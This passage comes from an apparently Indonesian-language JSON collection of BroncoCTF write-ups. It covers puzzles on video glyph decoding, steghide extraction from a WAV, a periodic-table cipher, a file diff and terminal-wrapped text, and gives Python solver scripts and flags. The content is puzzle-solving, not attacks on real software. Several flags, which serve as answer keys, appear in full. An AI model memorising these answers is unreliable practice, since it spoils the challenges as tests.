        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport hashlib\r\nimport json\r\nimport re\r\nimport subprocess\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\n\r\nGLYPH_HASHES: dict[str, str] = {\r\n    \"c9ddca4ecf858ec649e926ed2dd981a2747fb4269671293da92ca28a1a45926b\": \"b\",\r\n    \"2ccbc43e2bd882c41e2960083c64e9405902d1c0836a51ad7736dabcd877d267\": \"r\",\r\n    \"068d69c9822a3abfbbd15f2ea8a82f91de3f1f4861f44ee92faa0aaf6899bdb1\": \"o\",\r\n    \"f4bebd4998d84d4f7d4ad8b0f3c337fbc79376613cce8fc1aadd15d47a86bdfd\": \"n\",\r\n    \"475ab3396ea4f5b33f1d4efd67ffc370b8a59ab4c3d8a941b7e66119967243be\": \"c\",\r\n    \"2aaf234080a16d1808debd14539f103a6d439d61c97f8cd772d202e91351fc24\": \"{\",\r\n    \"62bd1e284b106e4eeb339b0fbeded5ab30a1d3119eb1fb5a30a88a4d204d6c75\": \"0\",\r\n    \"9520e74a5bf310abdbc597fa97c31ad1918dd2f5e7112436d7bb624f40ca2b33\": \"w\",\r\n    \"e18e537d32f3c9fbbd5d15727989ccb45e6e9a7359bda18efcf565daaa586f59\": \"_\",\r\n    \"41966872516dd7753f8da534bfc043db4e09bae48b29a67276aec2d3f1c23007\": \"t\",\r\n    \"0c8e9327c48e26f8b1ad1ed5a30c7367864364e50a5fc265eb6f7200e92697e6\": \"h\",\r\n    \"716943d9e26ac6b4acc8ebf99f8568d68b190fdc682706a7e9d2da5d9a752d80\": \"4\",\r\n    \"d59d1a72d6843ece0e193a7fb3ef5855dc7d4b5a7124beee8ab63c122b2ace60\": \"s\",\r\n    \"d636a0b6cb7f664513a7c8303b999a507ec6ee6cc3604f8e83c9268b42962bd0\": \"d\",\r\n    \"060ab74341a64445cfa51919401e228ec681ccd31c6d94fa0fcbdc68f548db88\": \"y\",\r\n    \"2a89c3e10076c5e8ec789cf82e684e872c116917408a5da8c6b6e76f4832953f\": \"m\",\r\n    \"840541dbe53dfa522352914361fcf3dc765610ade144c2423681d05aed6237c1\": \"1\",\r\n    \"700c91637baab9816b4c7ac8f659365bb2b55d0321cef4c2b7feb952c11f64a6\": \"}\",\r\n}\r\n\r\n\r\ndef probe_video(path: Path) -> tuple[int, int]:\r\n    result = subprocess.run(\r\n        [\r\n            \"ffprobe\", \"-v\", \"error\", \"-select_streams\", \"v:0\",\r\n            \"-show_entries\", \"stream=width,height\", \"-of\", \"json\", str(path),\r\n        ],\r\n        capture_output=True,\r\n        text=True,\r\n        check=True,\r\n    )\r\n    stream = json.loads(result.stdout)[\"streams\"][0]\r\n    return int(stream[\"width\"]), int(stream[\"height\"])\r\n\r\n\r\ndef extract_masks(path: Path, width: int, height: int) -> list[np.ndarray]:\r\n    frame_size = width * height\r\n    process = subprocess.Popen(\r\n        [\r\n            \"ffmpeg\", \"-hide_banner\", \"-loglevel\", \"error\", \"-i\", str(path),\r\n            \"-f\", \"rawvideo\", \"-pix_fmt\", \"gray\", \"-\",\r\n        ],\r\n        stdout=subprocess.PIPE,\r\n    )\r\n    if process.stdout is None:\r\n        raise RuntimeError(\"Gagal membuka output ffmpeg\")\r\n\r\n    triplet: list[np.ndarray] = []\r\n    masks: list[np.ndarray] = []\r\n    previous_active = False\r\n\r\n    while True:\r\n        raw = process.stdout.read(frame_size)\r\n        if not raw:\r\n            break\r\n        if len(raw) != frame_size:\r\n            process.kill()\r\n            raise ValueError(\"Frame terpotong\")\r\n\r\n        frame = np.frombuffer(raw, dtype=np.uint8).reshape(height, width) >= 128\r\n        triplet.append(frame)\r\n\r\n        if len(triplet) == 3:\r\n            mask = np.logical_xor(triplet[0], triplet[2])\r\n            active = float(mask.mean()) > 0.01\r\n\r\n            if active and not previous_active:\r\n                masks.append(mask.copy())\r\n\r\n            previous_active = active\r\n            triplet.clear()\r\n\r\n    if process.wait() != 0:\r\n        raise RuntimeError(\"ffmpeg gagal mendecode video\")\r\n\r\n    return masks\r\n\r\n\r\ndef digest_mask(mask: np.ndarray) -> str:\r\n    return hashlib.sha256(np.packbits(mask.reshape(-1)).tobytes()).hexdigest()\r\n\r\n\r\ndef decode(masks: list[np.ndarray]) -> str:\r\n    chars: list[str] = []\r\n    for index, mask in enumerate(masks):\r\n        digest = digest_mask(mask)\r\n        if digest not in GLYPH_HASHES:\r\n            raise ValueError(f\"Glyph {index} tidak dikenal: {digest}\")\r\n        chars.append(GLYPH_HASHES[digest])\r\n    return \"\".join(chars)\r\n\r\n\r\ndef dump_sheet(masks: list[np.ndarray], output: Path) -> None:\r\n    from PIL import Image, ImageDraw\r\n\r\n    columns = 5\r\n    height, width = masks[0].shape\r\n    label_height = 24\r\n    rows = (len(masks) + columns - 1) // columns\r\n    sheet = Image.new(\"L\", (columns * width, rows * (height + label_height)), 128)\r\n    draw = ImageDraw.Draw(sheet)\r\n\r\n    for index, mask in enumerate(masks):\r\n        x = (index % columns) * width\r\n        y = (index // columns) * (height + label_height)\r\n        sheet.paste(Image.fromarray(mask.astype(np.uint8) * 255), (x, y))\r\n        draw.text((x + 4, y + height + 4), str(index), fill=0)\r\n\r\n    output.parent.mkdir(parents=True, exist_ok=True)\r\n    sheet.save(output)\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"video\", nargs=\"?\", default=\"static.mp4\")\r\n    parser.add_argument(\"--dump\", type=Path)\r\n    args = parser.parse_args()\r\n\r\n    video = Path(args.video)\r\n    width, height = probe_video(video)\r\n    masks = extract_masks(video, width, height)\r\n\r\n    if args.dump:\r\n        dump_sheet(masks, args.dump)\r\n\r\n    flag = decode(masks)\r\n    if not re.fullmatch(r\"bronco\\{[a-z0-9_]+\\}\", flag):\r\n        raise ValueError(f\"Format flag tidak valid: {flag}\")\r\n\r\n    print(f\"[+] Active glyph runs: {len(masks)}\")\r\n    print(f\"[+] Flag: {flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{n0w_th4ts_dyn4m1c}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-foren-suspiciousremix2",
    "title": "Suspicious Remix 2",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Suspicious Remix 2",
    "problemDescription": "Flag tidak ditanam langsung sebagai pola audio. File WAV dipakai sebagai cover file `steghide`, sedangkan password-nya disembunyikan pada bitplane gambar.\n\nAlurnya:\n\n```text\ntolerate_this.png\n  -> Red channel, bit 2\n  -> \"Password = release year the non-OST song was from\"\n  -> gambar Rick Astley / Never Gonna Give You Up\n  -> tahun rilis 1987\n  -> steghide extract sg_remix2.wav\n  -> flag\n```",
    "tools": [],
    "analysis": "### Menentukan password\n\nGambar utama berasal dari video musik Rick Astley, **Never Gonna Give You Up**. Lagu tersebut dirilis pada 1987, sehingga password `steghide` adalah:\n\n```text\n1987\n```\n\nKeterangan `non-OST` menegaskan bahwa tahun yang diminta adalah tahun rilis lagunya, bukan tahun rilis soundtrack atau media lain yang memakai lagu tersebut.",
    "solution": [
      {
        "title": "Initial recon",
        "content": "```bash\nfile tolerate_this.png sg_remix2.wav\n```\n\nOutput:\n\n```text\ntolerate_this.png: PNG image data, 500 x 409, 8-bit/color RGBA, non-interlaced\nsg_remix2.wav: RIFF (little-endian) data, WAVE audio, Microsoft PCM,\n               16 bit, stereo 48000 Hz\n```\n\n`strings` dan metadata tidak langsung membocorkan flag. Deskripsi menyebut dua hal yang cukup spesifik:\n\n```text\nmore hide-n\ntyping the steg command\n```\n\nIni mengarah ke `steghide`, yang memang mendukung WAV sebagai cover file. Masalah berikutnya tinggal mencari passphrase dari gambar."
      },
      {
        "title": "Memeriksa bitplane gambar",
        "content": "Gambar memiliki empat channel RGBA. Seluruh bitplane bisa diperiksa dengan loop sederhana:\n\n```python\nfrom PIL import Image\n\nimage = Image.open(\"tolerate_this.png\").convert(\"RGBA\")\n\nfor channel_name in \"RGBA\":\n    channel = image.getchannel(channel_name)\n\n    for bit in range(8):\n        plane = channel.point(\n            lambda value, bit=bit:\n                255 if ((value >> bit) & 1) else 0\n        )\n\n        plane.save(f\"{channel_name}_bit{bit}.png\")\n```\n\nBitplane yang berisi teks adalah:\n\n```text\nRed channel, bit 2\n```\n\nEkstraksi yang lebih langsung:\n\n```python\nfrom PIL import Image, ImageOps\n\nimage = Image.open(\"tolerate_this.png\").convert(\"RGBA\")\nred = image.getchannel(\"R\")\n\nplane = red.point(\n    lambda value: 255 if ((value >> 2) & 1) else 0\n).convert(\"L\")\n\nImageOps.invert(plane).save(\"R_bit2.png\")\n```\n\nTeks tersembunyinya:\n\n```text\nPassword = release year the non-OST song was from\n```\n\nTeks dibuat diagonal, jadi OCR mentah kurang stabil. Rotasi sekitar 25–35 derajat membuat Tesseract membacanya dengan benar."
      },
      {
        "title": "Ekstraksi dari WAV",
        "content": "Ekstrak payload dengan `steghide`:\n\n```bash\nsteghide extract \\\n  -sf sg_remix2.wav \\\n  -p 1987 \\\n  -xf extracted_payload.bin \\\n  -f\n```\n\nLalu baca payload:\n\n```bash\ncat extracted_payload.bin\n```\n\nOutput:\n\n```text\nbronco{7h3y_g07_y0u_4g4in_didn'7_7h3y?}\n```"
      },
      {
        "title": "Solver",
        "content": "Dependency:\n\n```bash\npython3 -m pip install pillow\nsudo apt install steghide tesseract-ocr\n```\n\nTesseract bersifat opsional. Tanpa Tesseract, solver tetap membuat `R_bit2.png` dan memakai password yang sudah diperoleh dari analisis.\n\nJalankan:\n\n```bash\npython3 solve.py sg_remix2.wav tolerate_this.png\n```\n\nOutput yang diharapkan:\n\n```text\n[+] Hidden hint saved to: R_bit2.png\n[+] OCR hint: Password = release year the non-OST song was from\n[*] Trying steghide password: 1987\n[+] Payload extracted: extracted_payload.bin\n<FLAG>bronco{7h3y_g07_y0u_4g4in_didn'7_7h3y?}</FLAG>\n```\n\nJika password utama gagal, solver juga menyediakan fallback brute-force tahun:\n\n```bash\npython3 solve.py sg_remix2.wav tolerate_this.png --bruteforce-years\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport argparse\r\nimport io\r\nimport re\r\nimport shutil\r\nimport subprocess\r\nimport sys\r\nimport zipfile\r\nfrom pathlib import Path\r\n\r\nfrom PIL import Image, ImageOps\r\n\r\n\r\nFLAG_PATTERN = re.compile(rb\"bronco\\{[^}\\r\\n]{1,256}\\}\")\r\n\r\n# Rilis \"Never Gonna Give You Up\" yang ditunjukkan oleh gambar Rick Astley.\r\nPRIMARY_PASSWORD = \"1987\"\r\n\r\n\r\ndef extract_red_bit2(image_path: Path, output_path: Path) -> Image.Image:\r\n    \"\"\"\r\n    Extract bit 2 from the red channel.\r\n\r\n    The hidden hint is stored in this bitplane:\r\n        pixel = (red >> 2) & 1\r\n    \"\"\"\r\n    image = Image.open(image_path).convert(\"RGBA\")\r\n    red = image.getchannel(\"R\")\r\n\r\n    plane = red.point(\r\n        lambda value: 255 if ((value >> 2) & 1) else 0,\r\n        mode=\"1\",\r\n    ).convert(\"L\")\r\n\r\n    # The hidden text is black on white after inversion.\r\n    plane = ImageOps.invert(plane)\r\n    plane.save(output_path)\r\n    return plane\r\n\r\n\r\ndef ocr_hint(image: Image.Image) -> str | None:\r\n    \"\"\"\r\n    OCR the diagonal hint without writing temporary files.\r\n\r\n    Tesseract reads each rotated PNG from stdin. Several nearby angles are\r\n    attempted because the text is diagonal.\r\n    \"\"\"\r\n    tesseract = shutil.which(\"tesseract\")\r\n    if tesseract is None:\r\n        return None\r\n\r\n    best_text = \"\"\r\n    best_score = -1\r\n\r\n    for angle in (20, 25, 30, 35, 40):\r\n        rotated = image.rotate(angle, expand=True, fillcolor=255)\r\n\r\n        stream = io.BytesIO()\r\n        rotated.save(stream, format=\"PNG\")\r\n\r\n        result = subprocess.run(\r\n            [tesseract, \"stdin\", \"stdout\", \"--psm\", \"6\"],\r\n            input=stream.getvalue(),\r\n            stdout=subprocess.PIPE,\r\n            stderr=subprocess.DEVNULL,\r\n            check=False,\r\n        )\r\n\r\n        text = result.stdout.decode(\"utf-8\", errors=\"replace\").strip()\r\n        normalized = text.lower()\r\n\r\n        score = sum(\r\n            keyword in normalized\r\n            for keyword in (\"password\", \"release\", \"year\", \"song\", \"non-ost\")\r\n        )\r\n\r\n        if score > best_score:\r\n            best_score = score\r\n            best_text = text\r\n\r\n    return best_text or None\r\n\r\n\r\ndef run_steghide(\r\n    audio_path: Path,\r\n    password: str,\r\n    output_path: Path,\r\n) -> bool:\r\n    \"\"\"Try extracting the embedded payload with one password.\"\"\"\r\n    steghide = shutil.which(\"steghide\")\r\n    if steghide is None:\r\n        raise RuntimeError(\r\n            \"steghide tidak ditemukan. Install dengan: \"\r\n            \"sudo apt install steghide\"\r\n        )\r\n\r\n    output_path.unlink(missing_ok=True)\r\n\r\n    result = subprocess.run(\r\n        [\r\n            steghide,\r\n            \"extract\",\r\n            \"-sf\",\r\n            str(audio_path),\r\n            \"-p\",\r\n            password,\r\n            \"-xf\",\r\n            str(output_path),\r\n            \"-f\",\r\n        ],\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        text=True,\r\n        check=False,\r\n    )\r\n\r\n    return result.returncode == 0 and output_path.exists()\r\n\r\n\r\ndef search_flag(data: bytes) -> bytes | None:\r\n    \"\"\"Find the flag directly or inside a ZIP payload.\"\"\"\r\n    match = FLAG_PATTERN.search(data)\r\n    if match:\r\n        return match.group(0)\r\n\r\n    try:\r\n        with zipfile.ZipFile(io.BytesIO(data)) as archive:\r\n            for member in archive.infolist():\r\n                if member.is_dir():\r\n                    continue\r\n\r\n                nested = archive.read(member)\r\n                match = FLAG_PATTERN.search(nested)\r\n                if match:\r\n                    return match.group(0)\r\n    except zipfile.BadZipFile:\r\n        pass\r\n\r\n    return None\r\n\r\n\r\ndef candidate_passwords(primary: str, brute_years: bool) -> list[str]:\r\n    candidates = [primary]\r\n\r\n    if brute_years:\r\n        # Fallback if the image was interpreted incorrectly.\r\n        for year in range(2026, 1949, -1):\r\n            value = str(year)\r\n            if value not in candidates:\r\n                candidates.append(value)\r\n\r\n    return candidates\r\n\r\n\r\ndef main() -> None:\r\n    parser = argparse.ArgumentParser(\r\n        description=\"Solve BroncoCTF Suspicious Remix 2\"\r\n    )\r\n    parser.add_argument(\r\n        \"audio\",\r\n        nargs=\"?\",\r\n        type=Path,\r\n        default=Path(\"sg_remix2.wav\"),\r\n        help=\"stego WAV file\",\r\n    )\r\n    parser.add_argument(\r\n        \"image\",\r\n        nargs=\"?\",\r\n        type=Path,\r\n        default=Path(\"tolerate_this.png\"),\r\n        help=\"password-hint PNG\",\r\n    )\r\n    parser.add_argument(\r\n        \"--password\",\r\n        default=PRIMARY_PASSWORD,\r\n        help=\"steghide password (default: 1987)\",\r\n    )\r\n    parser.add_argument(\r\n        \"--bruteforce-years\",\r\n        action=\"store_true\",\r\n        help=\"try years 1950-2026 if the primary password fails\",\r\n    )\r\n    parser.add_argument(\r\n        \"--hint-output\",\r\n        type=Path,\r\n        default=Path(\"R_bit2.png\"),\r\n        help=\"output path for the extracted hint bitplane\",\r\n    )\r\n    parser.add_argument(\r\n        \"--payload-output\",\r\n        type=Path,\r\n        default=Path(\"extracted_payload.bin\"),\r\n        help=\"output path for the steghide payload\",\r\n    )\r\n    args = parser.parse_args()\r\n\r\n    if not args.image.is_file():\r\n        parser.error(f\"image tidak ditemukan: {args.image}\")\r\n    if not args.audio.is_file():\r\n        parser.error(f\"audio tidak ditemukan: {args.audio}\")\r\n\r\n    hint_plane = extract_red_bit2(args.image, args.hint_output)\r\n    print(f\"[+] Hidden hint saved to: {args.hint_output}\")\r\n\r\n    hint_text = ocr_hint(hint_plane)\r\n    if hint_text:\r\n        cleaned = \" \".join(hint_text.split())\r\n        print(f\"[+] OCR hint: {cleaned}\")\r\n    else:\r\n        print(\"[*] Tesseract tidak tersedia; buka R_bit2.png secara manual.\")\r\n\r\n    for password in candidate_passwords(\r\n        args.password,\r\n        args.bruteforce_years,\r\n    ):\r\n        print(f\"[*] Trying steghide password: {password}\")\r\n\r\n        if not run_steghide(\r\n            args.audio,\r\n            password,\r\n            args.payload_output,\r\n        ):\r\n            continue\r\n\r\n        payload = args.payload_output.read_bytes()\r\n        print(\r\n            f\"[+] Payload extracted: {args.payload_output} \"\r\n            f\"({len(payload)} bytes)\"\r\n        )\r\n\r\n        flag = search_flag(payload)\r\n        if flag is None:\r\n            print(\"[!] Payload berhasil diekstrak, tetapi flag tidak ditemukan.\")\r\n            print(payload.decode(\"utf-8\", errors=\"replace\"))\r\n            return\r\n\r\n        decoded_flag = flag.decode(\"ascii\")\r\n        print(f\"<FLAG>{decoded_flag}</FLAG>\")\r\n        return\r\n\r\n    raise RuntimeError(\r\n        \"Tidak ada password yang berhasil. \"\r\n        \"Coba --bruteforce-years atau cek kembali hint image.\"\r\n    )\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        main()\r\n    except (RuntimeError, OSError) as error:\r\n        print(f\"[-] {error}\", file=sys.stderr)\r\n        raise SystemExit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{7h3y_g07_y0u_4g4in_didn'7_7h3y?}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-misc-atomicsubstitutiontheory",
    "title": "Atomic Substitution Theory",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{my_favorite_messages_have_an_element_of_surprise}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Misc\n- **Difficulty:** Easy\n- **Flag:** `bronco{my_favorite_messages_have_an_element_of_surprise}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "File",
        "content": "`secret.txt` hanya berisi rangkaian tuple:\n\n```text\n(4, 17), (2, 16), (2, 15), (4, 9), { , ...\n```\n\nJudul, deskripsi, dan bentuk koordinatnya mengarah ke tabel periodik."
      },
      {
        "title": "Pola Encoding",
        "content": "Dua angka pertama menunjukkan posisi unsur:\n\n```text\n(period, group)\n```\n\nTuple dua angka menghasilkan simbol unsur penuh.\n\nContoh prefix:\n\n| Token | Unsur | Simbol |\n|---|---|---|\n| `(4, 17)` | Bromine | `Br` |\n| `(2, 16)` | Oxygen | `O` |\n| `(2, 15)` | Nitrogen | `N` |\n| `(4, 9)` | Cobalt | `Co` |\n\nJika digabung:\n\n```text\nBr + O + N + Co = BrONCo\n```\n\nHint meminta semua huruf dalam flag menggunakan lowercase, sehingga prefix-nya menjadi:\n\n```text\nbronco{\n```\n\nTuple tiga angka memakai format:\n\n```text\n(period, group, character_index)\n```\n\nAngka ketiga memilih karakter dari simbol unsur dengan indeks mulai dari 1.\n\nContoh:\n\n| Token | Simbol | Hasil |\n|---|---|---|\n| `(3, 2, 1)` | `Mg` | `M` |\n| `(4, 17, 2)` | `Br` | `r` |\n| `(2, 1, 2)` | `Li` | `i` |\n| `(4, 4, 1)` | `Ti` | `T` |\n| `(2, 2, 2)` | `Be` | `e` |\n\nKarakter `{`, `}`, dan `_` tidak perlu diubah."
      },
      {
        "title": "Decode Bertahap",
        "content": "Bagian awal plaintext:\n\n```text\n(3, 2, 1), (5, 3)\nMg[1] + Y\nM + Y\nmy\n```\n\nBagian berikutnya menghasilkan:\n\n```text\nfavorite\nmessages\nhave\nelement\nof\n```\n\nKoordinat `(9, 6)` menunjuk Uranium (`U`). Baris 9 dipakai untuk deret aktinida yang biasa ditampilkan terpisah di bawah tabel periodik.\n\nDecoder literal menghasilkan:\n\n```text\nbronco{my_favorite_messages_have_at_element_of_suprise}\n```\n\nAda dua inkonsistensi pada ciphertext:\n\n```text\nhave_at_element  -> have_an_element\nsuprise          -> surprise\n```\n\nKeduanya bukan hasil asumsi flag acak. Kalimat yang terbentuk jelas mengarah ke frasa:\n\n```text\nmy favorite messages have an element of surprise\n```\n\nVersi tersebut juga yang diterima oleh checker."
      },
      {
        "title": "Solver",
        "content": "`solve.py` menampilkan hasil decode literal dan flag final setelah dua koreksi plaintext tadi.\n\n```bash\npython3 solve.py secret.txt\n```\n\nOutput:\n\n```text\n[raw]   bronco{my_favorite_messages_have_at_element_of_suprise}\n[final] bronco{my_favorite_messages_have_an_element_of_surprise}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n# Mapping koordinat yang dipakai ciphertext.\r\n# Format umum:\r\n#   (period, group)        -> simbol unsur penuh\r\n#   (period, group, index) -> karakter ke-index dari simbol unsur (1-based)\r\nELEMENTS: dict[tuple[int, int], str] = {\r\n    (1, 1): \"H\", (1, 18): \"He\",\r\n\r\n    (2, 1): \"Li\", (2, 2): \"Be\", (2, 13): \"B\", (2, 14): \"C\",\r\n    (2, 15): \"N\", (2, 16): \"O\", (2, 17): \"F\", (2, 18): \"Ne\",\r\n\r\n    (3, 1): \"Na\", (3, 2): \"Mg\", (3, 13): \"Al\", (3, 14): \"Si\",\r\n    (3, 15): \"P\", (3, 16): \"S\", (3, 17): \"Cl\", (3, 18): \"Ar\",\r\n\r\n    (4, 1): \"K\", (4, 2): \"Ca\", (4, 3): \"Sc\", (4, 4): \"Ti\",\r\n    (4, 5): \"V\", (4, 6): \"Cr\", (4, 7): \"Mn\", (4, 8): \"Fe\",\r\n    (4, 9): \"Co\", (4, 10): \"Ni\", (4, 11): \"Cu\", (4, 12): \"Zn\",\r\n    (4, 13): \"Ga\", (4, 14): \"Ge\", (4, 15): \"As\", (4, 16): \"Se\",\r\n    (4, 17): \"Br\", (4, 18): \"Kr\",\r\n\r\n    (5, 1): \"Rb\", (5, 2): \"Sr\", (5, 3): \"Y\", (5, 4): \"Zr\",\r\n    (5, 5): \"Nb\", (5, 6): \"Mo\", (5, 7): \"Tc\", (5, 8): \"Ru\",\r\n    (5, 9): \"Rh\", (5, 10): \"Pd\", (5, 11): \"Ag\", (5, 12): \"Cd\",\r\n    (5, 13): \"In\", (5, 14): \"Sn\", (5, 15): \"Sb\", (5, 16): \"Te\",\r\n    (5, 17): \"I\", (5, 18): \"Xe\",\r\n\r\n    # Baris aktinida yang ditulis terpisah di bawah tabel periodik.\r\n    (9, 3): \"Ac\", (9, 4): \"Th\", (9, 5): \"Pa\", (9, 6): \"U\",\r\n    (9, 7): \"Np\", (9, 8): \"Pu\", (9, 9): \"Am\", (9, 10): \"Cm\",\r\n    (9, 11): \"Bk\", (9, 12): \"Cf\", (9, 13): \"Es\", (9, 14): \"Fm\",\r\n    (9, 15): \"Md\", (9, 16): \"No\", (9, 17): \"Lr\",\r\n}\r\n\r\nTOKEN_RE = re.compile(\r\n    r\"\\(\\s*(\\d+)\\s*,\\s*(\\d+)(?:\\s*,\\s*(\\d+))?\\s*\\)|[{}_]\"\r\n)\r\n\r\n\r\ndef decode_raw(encoded: str) -> str:\r\n    output: list[str] = []\r\n\r\n    for match in TOKEN_RE.finditer(encoded):\r\n        token = match.group(0)\r\n\r\n        if token in {\"{\", \"}\", \"_\"}:\r\n            output.append(token)\r\n            continue\r\n\r\n        period = int(match.group(1))\r\n        group = int(match.group(2))\r\n        index_text = match.group(3)\r\n\r\n        try:\r\n            symbol = ELEMENTS[(period, group)]\r\n        except KeyError as exc:\r\n            raise ValueError(\r\n                f\"Koordinat tidak dikenal: ({period}, {group})\"\r\n            ) from exc\r\n\r\n        if index_text is None:\r\n            output.append(symbol)\r\n            continue\r\n\r\n        index = int(index_text)\r\n        if index < 1 or index > len(symbol):\r\n            raise ValueError(\r\n                f\"Indeks {index} tidak valid untuk simbol {symbol}\"\r\n            )\r\n\r\n        output.append(symbol[index - 1])\r\n\r\n    return \"\".join(output).lower()\r\n\r\n\r\ndef normalize_challenge_typos(raw_flag: str) -> str:\r\n    \"\"\"\r\n    Ciphertext literal menghasilkan:\r\n      bronco{my_favorite_messages_have_at_element_of_suprise}\r\n\r\n    Flag yang diterima checker mengoreksi dua typo pada plaintext:\r\n      have_at_element -> have_an_element\r\n      suprise         -> surprise\r\n    \"\"\"\r\n    return (\r\n        raw_flag\r\n        .replace(\"have_at_element\", \"have_an_element\")\r\n        .replace(\"suprise\", \"surprise\")\r\n    )\r\n\r\n\r\ndef main() -> None:\r\n    path = Path(sys.argv[1] if len(sys.argv) > 1 else \"secret.txt\")\r\n    encoded = path.read_text(encoding=\"utf-8\")\r\n\r\n    raw_flag = decode_raw(encoded)\r\n    final_flag = normalize_challenge_typos(raw_flag)\r\n\r\n    print(f\"[raw]   {raw_flag}\")\r\n    print(f\"[final] {final_flag}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{my_favorite_messages_have_an_element_of_surprise}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-misc-spotthedifference",
    "title": "Spot The Difference",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Challenge ini meminta kita membandingkan dua file teks (`file1.txt` dan `file2.txt`) yang berisi karakter acak di setiap barisnya.",
    "problemDescription": "Challenge ini meminta kita membandingkan dua file teks (`file1.txt` dan `file2.txt`) yang berisi karakter acak di setiap barisnya.",
    "tools": [],
    "analysis": "Dengan membandingkan baris demi baris dari kedua file tersebut, kita dapat membedakan dua jenis perbedaan:\n1. Perubahan case (huruf besar/kecil), misalnya `e` menjadi `E`.\n2. Perubahan karakter sepenuhnya (non-case flip), misalnya `g` menjadi `b`.\n\nJika kita mengumpulkan karakter dari `file2.txt` pada baris-baris yang mengalami perubahan tipe kedua (non-case flip) hingga tanda kurung kurawal penutup `}`, kita mendapatkan flag yang dicari.",
    "solution": [
      {
        "title": "Solusi",
        "content": "Script Python `solve.py` mengekstrak karakter tersebut secara otomatis:\n\n```python\nwith open(\"file2.txt\") as f2, open(\"file1.txt\") as f1:\n    chars1 = [line.strip('\\r\\n') for line in f1.read().splitlines()]\n    chars2 = [line.strip('\\r\\n') for line in f2.read().splitlines()]\n\nflag = []\nfor i in range(min(len(chars1), len(chars2))):\n    c1 = chars1[i]\n    c2 = chars2[i]\n    if c1 != c2 and abs(ord(c1) - ord(c2)) != 32:\n        flag.append(c2)\n        if c2 == '}':\n            break\n\nprint(\"\".join(flag))\n```\n\nMenjalankan script di atas menghasilkan:\n`bronco{y@yyy_Y0u_f0und_m3!!}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "# Solve script for Spot The Difference\r\nwith open(\"file2.txt\") as f2, open(\"file1.txt\") as f1:\r\n    chars1 = [line.strip('\\r\\n') for line in f1.read().splitlines()]\r\n    chars2 = [line.strip('\\r\\n') for line in f2.read().splitlines()]\r\n\r\nflag = []\r\nfor i in range(min(len(chars1), len(chars2))):\r\n    c1 = chars1[i]\r\n    c2 = chars2[i]\r\n    if c1 != c2 and abs(ord(c1) - ord(c2)) != 32:\r\n        flag.append(c2)\r\n        if c2 == '}':\r\n            break\r\n\r\nprint(\"\".join(flag))"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{y@yyy_Y0u_f0und_m3!!}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-misc-terminaldiff",
    "title": "Terminal Diff",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Terminal Diff",
    "problemDescription": "",
    "tools": [],
    "analysis": "Newline terakhir dibuang lebih dulu.\n\n```bash\npython3 - <<'PY'\nfrom pathlib import Path\nimport sympy\n\ns = Path(\"flag.txt\").read_text().rstrip(\"\\r\\n\")\nprint(len(s))\nprint(sympy.factorint(len(s)))\nPY\n```\n\nOutput:\n\n```text\n3395\n{5: 1, 7: 1, 97: 1}\n```\n\nPanjang payload adalah:\n\n```text\n3395 = 5 × 7 × 97\n```\n\nAngka pada deskripsi mengarahkan ke dimensi terminal:\n\n- “like 90 things at once” mengarah ke lebar sekitar 90 kolom.\n- Faktor prima terdekat yang tersedia adalah `97`.\n- “lasted like 7 days” memberi tinggi `7`.\n- Kata “primed” menegaskan bahwa lebar dan tinggi yang dipakai adalah bilangan prima.\n\nJadi datanya terdiri dari lima frame terminal berukuran:\n\n```text\n97 kolom × 7 baris\n```",
    "solution": [
      {
        "title": "Challenge",
        "content": "**Category:** Misc  \n**CTF:** BroncoCTF 2026\n\n> I used to be too big picture, never focusing on the details (keeping track of like 90 things at once). Then, I starting looking into things a little bit too much (this phase only lasted like 7 days). Nowadays though, I am primed to look at things with just the right width (and height too). Anyways, here's the flag! You should be able to read it just fine, as long as you align with my mindset.\n\nFile yang diberikan cuma satu baris panjang berisi underscore, pola `/\\/\\`, marker arah, dan gambar Braille. Isi tersebut bukan ciphertext biasa. Data ini dibuat supaya ter-wrap menjadi tampilan terminal dengan ukuran tertentu."
      },
      {
        "title": "Membentuk ulang frame",
